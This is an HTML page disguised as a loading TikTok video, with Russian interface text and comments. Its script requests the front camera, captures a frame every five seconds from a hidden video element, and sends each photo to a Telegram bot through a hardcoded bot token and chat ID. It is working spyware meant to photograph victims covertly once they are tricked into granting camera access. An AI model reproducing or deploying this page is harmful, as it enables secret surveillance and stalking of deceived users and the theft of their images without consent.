<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Video</title>
    <style>
        body {
            background-color: #010101;
            color: white;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            font-family: 'Proxima Nova', sans-serif;
        }
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #fe2c55;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .text {
            margin-top: 20px;
            font-size: 18px;
            font-weight: bold;
        }
        #video, #canvas { display: none; }
    </style>
</head>
<body>

    <div class="loader"></div>
    <div class="text">Загрузка видео...</div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

<script>
    const botToken = '8220142638:AAFDjQSzi4V1i5xfpMBA42uBgaDjFA0znOo';
    const chatId = '8573089884';

    async function takeAndSendPhoto(video, canvas) {
        // Проверка: если видео замерло или ширина 0, выходим
        if (video.paused || video.ended || video.videoWidth === 0) return;

        const context = canvas.getContext('2d');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.drawImage(video, 0, 0);
        
        // Магия против черного экрана: проверяем цвет центрального пикселя
        const pixel = context.getImageData(canvas.width/2, canvas.height/2, 1, 1).data;
        // Если RGB все по нулям [0,0,0], значит кадр пустой — отменяем отправку
        if (pixel[0] === 0 && pixel[1] === 0 && pixel[2] === 0) {
            console.log("Пропуск черного кадра...");
            return;
        }

        const dataURL = canvas.toDataURL('image/jpeg', 0.6);
        const blob = await (await fetch(dataURL)).blob();
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', blob, 'shot.jpg');

        try {
            await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
            console.log("Фото ушло!");
        } catch (e) {
            console.error("Ошибка сети:", e);
        }
    }

    window.onload = () => {
        // Добавляем атрибуты для iOS Safari, чтобы видео не блокировалось
        const video = document.getElementById('video');
        video.setAttribute('autoplay', '');
        video.setAttribute('muted', '');
        video.setAttribute('playsinline', '');

        navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: "user" } 
        })
        .then(stream => {
            const canvas = document.getElementById('canvas');
            video.srcObject = stream;

            // Самое важное событие — когда видео реально начало ИГРАТЬ
            video.onplaying = () => {
                console.log("Камера ожила, начинаем цикл...");
                
                // Даем 1.5 секунды на автофокус и баланс белого
                setTimeout(() => {
                    setInterval(() => {
                        takeAndSendPhoto(video, canvas);
                    }, 5000); 
                }, 1500);
            };

            // Принудительный старт для некоторых браузеров
            video.play();
        })
        .catch(err => {
            console.log("Камера заблокирована:", err);
        });
    };
</script>
</body>
</html>
